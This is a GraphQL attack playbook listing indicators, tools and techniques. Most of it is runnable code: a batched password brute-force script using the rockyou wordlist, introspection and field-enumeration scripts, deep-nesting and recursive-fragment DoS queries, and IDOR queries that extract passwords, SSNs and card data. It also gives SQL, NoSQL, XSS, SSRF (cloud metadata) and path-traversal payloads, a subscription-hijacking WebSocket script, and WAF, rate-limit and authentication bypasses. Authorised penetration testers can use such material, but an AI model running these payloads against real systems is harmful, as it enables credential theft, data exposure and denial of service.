# GraphQL Playbook

## Indicators

Signs this vulnerability may be present:
- Endpoint paths containing `/graphql`, `/gql`, `/v1/graphql`, `/api/graphql`
- Responses with JSON structure containing `data`, `errors`, or `extensions` fields
- Error messages mentioning GraphQL types, fields, or schema elements
- Content-Type headers with `application/graphql` or GraphQL-specific responses
- Presence of GraphQL Playground, GraphiQL, or Altair interfaces at common paths
- WebSocket connections at `/subscriptions` or similar endpoints
- HTTP responses containing `__typename` field in JSON
- Developer tools network tab showing POST requests with `query` or `mutation` in body

## Tools

### InQL Scanner (Burp Extension)

```bash
# InQL is typically used through Burp Suite
# For CLI scanning, use the Python version
pip install inql

# Scan endpoint for introspection
inql -t http://target.com/graphql

# Generate queries from schema
inql -t http://target.com/graphql -o ./output

# Use custom headers
inql -t http://target.com/graphql -H "Authorization: Bearer token123"
```

### graphql-path-enum

```bash
# Clone and setup
git clone https://github.com/nicholasaleks/graphql-path-enum
cd graphql-path-enum
pip install -r requirements.txt

# Enumerate paths from schema
python graphql_path_enum.py -u http://target.com/graphql -o paths.txt

# With authentication
python graphql_path_enum.py -u http://target.com/graphql -H "Authorization: Bearer token"
```

### GraphQL Voyager

```bash
# GraphQL Voyager is a web-based schema visualization tool
# Run locally with Docker
docker run -p 8080:8080 graphql/voyager

# Point it at target endpoint to visualize schema relationships
# Useful for understanding complex schemas and finding attack paths
```

### Altair GraphQL Client

```bash
# Desktop application for GraphQL testing
# Download from: https://altair.sirmuel.design/

# Features:
# - Introspection query execution
# - Request/response history
# - Custom headers and authentication
# - File uploads for mutations
# - Subscriptions support via WebSocket
```

### curl for Manual Testing

```bash
# Basic introspection query
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}'

# Full introspection query
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}"}'

# With authorization header
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer eyJ..." \
  -d '{"query":"{ users { id email } }"}'

# POST with variables
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query GetUser($id: ID!) { user(id: $id) { name } }","variables":{"id":"1"}}'
```

### graphw00f - GraphQL Fingerprinting

```bash
# Clone and setup
git clone https://github.com/dolevf/graphw00f
cd graphw00f
pip install -r requirements.txt

# Fingerprint GraphQL engine
python main.py -t http://target.com/graphql

# Detect GraphQL implementation (Apollo, Hasura, etc.)
python main.py -t http://target.com/graphql -f
```

### BatchQL - Batching Attack Tool

```bash
# Clone and setup
git clone https://github.com/assetnote/batchql
cd batchql

# Test for batching vulnerabilities
python batchql.py -e http://target.com/graphql -q "{ users { id } }"
```

## Techniques

### 1. Introspection Query Attacks

Extract full schema when introspection is enabled.

```graphql
# Basic type enumeration
{
  __schema {
    types {
      name
      kind
      description
    }
  }
}

# Full introspection query
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
            }
          }
        }
      }
    }
  }
}

# Query specific type details
{
  __type(name: "User") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}

# Enumerate query entry points
{
  __schema {
    queryType {
      fields {
        name
        args {
          name
          type {
            name
            kind
          }
        }
      }
    }
  }
}

# Enumerate mutation entry points
{
  __schema {
    mutationType {
      fields {
        name
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}
```

### 2. Field Suggestion Enumeration

When introspection is disabled, use error-based field discovery.

```bash
# Send invalid field names to trigger suggestions
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user { passwor } }"}'

# Response may reveal: "Did you mean 'password'?"

# Enumerate with common field names
for field in id name email password username admin role token secret; do
  curl -s -X POST http://target.com/graphql \
    -H "Content-Type: application/json" \
    -d "{\"query\":\"{ user { ${field}x } }\"}" | grep -i "did you mean"
done
```

```python
#!/usr/bin/env python3
# Field enumeration script
import requests
import string

url = "http://target.com/graphql"
headers = {"Content-Type": "application/json"}

# Common field names to probe
fields = ["id", "name", "email", "password", "token", "role", "admin",
          "secret", "key", "hash", "salt", "ssn", "credit", "account"]

discovered = set()

for field in fields:
    # Add typo to trigger suggestion
    query = f'{{ user {{ {field}xyz }} }}'
    data = {"query": query}
    response = requests.post(url, json=data, headers=headers)

    if "Did you mean" in response.text:
        print(f"[+] Field suggestion for '{field}': {response.text}")
        discovered.add(field)

print(f"\nDiscovered fields: {discovered}")
```

### 3. Batching Attacks

Execute multiple queries in a single request for brute force or DoS.

```bash
# Array-based batching (most common)
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"{ user(id: 1) { password } }"},
    {"query":"{ user(id: 2) { password } }"},
    {"query":"{ user(id: 3) { password } }"}
  ]'

# Alias-based batching within single query
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{
    u1: user(id: 1) { password }
    u2: user(id: 2) { password }
    u3: user(id: 3) { password }
  }"}'

# Brute force login via batching
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"mutation { login(email: \"admin@test.com\", password: \"password1\") { token } }"},
    {"query":"mutation { login(email: \"admin@test.com\", password: \"password2\") { token } }"},
    {"query":"mutation { login(email: \"admin@test.com\", password: \"password3\") { token } }"}
  ]'
```

```python
#!/usr/bin/env python3
# Batch brute force script
import requests

url = "http://target.com/graphql"
headers = {"Content-Type": "application/json"}

with open("/usr/share/wordlists/rockyou.txt", "r", errors="ignore") as f:
    passwords = [line.strip() for line in f.readlines()[:1000]]

# Batch 100 passwords per request
batch_size = 100
for i in range(0, len(passwords), batch_size):
    batch = passwords[i:i+batch_size]
    queries = []

    for j, pwd in enumerate(batch):
        queries.append({
            "query": f'mutation {{ login(email: "admin@test.com", password: "{pwd}") {{ token }} }}'
        })

    response = requests.post(url, json=queries, headers=headers)

    for j, result in enumerate(response.json()):
        if result.get("data", {}).get("login", {}).get("token"):
            print(f"[+] Found password: {batch[j]}")
            break
```

### 4. Query Depth and Complexity Attacks

Exploit missing depth limits for DoS or resource exhaustion.

```graphql
# Deep nested query (may cause DoS)
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              friends {
                id
                name
              }
            }
          }
        }
      }
    }
  }
}

# Recursive fragment attack
query {
  user(id: 1) {
    ...F1
  }
}

fragment F1 on User {
  friends {
    ...F2
  }
}

fragment F2 on User {
  friends {
    ...F3
  }
}

fragment F3 on User {
  friends {
    ...F1
  }
}

# Wide query with many fields
{
  user1: user(id: 1) { id name email }
  user2: user(id: 2) { id name email }
  user3: user(id: 3) { id name email }
  # ... repeat hundreds of times
}
```

### 5. Authorization Bypass via IDOR

Access other users' data through predictable ID patterns.

```graphql
# Direct object access
{
  user(id: 1) {
    id
    email
    password
    ssn
  }
}

# Node/Relay-style IDOR
{
  node(id: "VXNlcjox") {  # Base64 encoded "User:1"
    ... on User {
      id
      email
      privateData
    }
  }
}

# Enumerate via Relay connections
{
  users(first: 100) {
    edges {
      node {
        id
        email
      }
    }
    pageInfo {
      hasNextPage
      endCursor
    }
  }
}

# Access nested sensitive data
{
  publicPost(id: 1) {
    author {
      email
      privateProfile {
        ssn
        creditCard
      }
    }
  }
}
```

### 6. Injection in Variables

Inject malicious payloads through GraphQL variables.

```bash
# SQL injection via variables
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query GetUser($id: String!) { user(id: $id) { name } }",
    "variables": {"id": "1 OR 1=1--"}
  }'

# NoSQL injection
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query GetUser($filter: UserFilter!) { users(filter: $filter) { name } }",
    "variables": {"filter": {"$ne": null}}
  }'

# XSS via stored mutation
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation UpdateProfile($bio: String!) { updateProfile(bio: $bio) { id } }",
    "variables": {"bio": "<script>alert(1)</script>"}
  }'

# SSRF via URL variable
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation ImportData($url: String!) { importFromUrl(url: $url) { status } }",
    "variables": {"url": "http://169.254.169.254/latest/meta-data/"}
  }'

# Path traversal
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query GetFile($path: String!) { file(path: $path) { content } }",
    "variables": {"path": "../../../etc/passwd"}
  }'
```

### 7. Directive Injection

Abuse custom or standard directives.

```graphql
# Skip authorization checks with directives
{
  user(id: 1) @skip(if: false) {
    password @include(if: true)
  }
}

# Custom directive abuse
{
  user(id: 1) @auth(role: "ADMIN") {
    sensitiveData
  }
}

# Deprecated field access
{
  user(id: 1) {
    oldPassword @deprecated
  }
}
```

### 8. Subscription Hijacking

Exploit WebSocket-based GraphQL subscriptions.

```javascript
// WebSocket subscription hijacking
const ws = new WebSocket('ws://target.com/subscriptions');

ws.onopen = () => {
  // Initialize connection
  ws.send(JSON.stringify({
    type: 'connection_init',
    payload: {}
  }));

  // Subscribe to all user updates (potential data leak)
  ws.send(JSON.stringify({
    id: '1',
    type: 'start',
    payload: {
      query: `subscription {
        userUpdated {
          id
          email
          password
        }
      }`
    }
  }));
};

ws.onmessage = (event) => {
  console.log('Received:', event.data);
};
```

```bash
# Using websocat for subscription testing
websocat ws://target.com/subscriptions

# Then send:
# {"type":"connection_init","payload":{}}
# {"id":"1","type":"start","payload":{"query":"subscription { userUpdated { id } }"}}
```

## Bypass Techniques

### Introspection Disabled Bypass

```graphql
# Try alternate introspection endpoints
# GET request with query parameter
GET /graphql?query={__schema{types{name}}}

# Case variations
{ __SCHEMA { types { name } } }
{ __Schema { types { name } } }

# Unicode variations
{ \u005f\u005fschema { types { name } } }

# Newline/whitespace injection
{
__schema
{types{name}}
}

# Via alias
{
  introspection: __schema { types { name } }
}

# Partial introspection (sometimes allowed)
{ __type(name: "Query") { fields { name } } }
```

### Rate Limiting Bypass

```bash
# Bypass via batching
curl -X POST http://target.com/graphql \
  -d '[{"query":"{ user(id: 1) { password } }"},
       {"query":"{ user(id: 2) { password } }"}]'

# Bypass via aliases
curl -X POST http://target.com/graphql \
  -d '{"query":"{ a: user(id: 1) { password } b: user(id: 2) { password } }"}'

# Bypass via fragments
curl -X POST http://target.com/graphql \
  -d '{"query":"query { ...F } fragment F on Query { user(id: 1) { password } }"}'
```

### WAF Bypass Payloads

```graphql
# Newline injection
{\n__schema{\ntypes{\nname\n}\n}\n}

# Tab injection
{	__schema{	types{	name	}	}	}

# Comment injection
{#comment
__schema{types{name}}}

# Unicode escape
{\u0020__schema{types{name}}}

# Duplicate parameters (HPP)
{"query":"{user{id}}","query":"{__schema{types{name}}}"}
```

### Authentication Bypass

```graphql
# Test queries without auth headers
{
  user(id: 1) {
    id
    email
  }
}

# Access through nested relationships
{
  publicResource {
    owner {
      privateData
    }
  }
}

# Use deprecated/hidden queries
{
  __schema {
    queryType {
      fields(includeDeprecated: true) {
        name
        isDeprecated
      }
    }
  }
}

# Mutation without auth check
mutation {
  deleteUser(id: 1) {
    success
  }
}
```

## Success Indicators

- Full schema extracted via introspection query
- Sensitive fields discovered (password, token, ssn, creditCard)
- Unauthorized data access through IDOR patterns
- Successful injection payloads executed (SQL, NoSQL, XSS)
- DoS achieved through deep/complex queries
- Rate limiting bypassed via batching
- Authentication bypassed through unprotected mutations
- Subscription data leaked via WebSocket hijacking
- Hidden or deprecated fields/queries discovered
- Error messages revealing internal implementation details
- Successful brute force through batch mutations
- File paths or system information exposed through errors
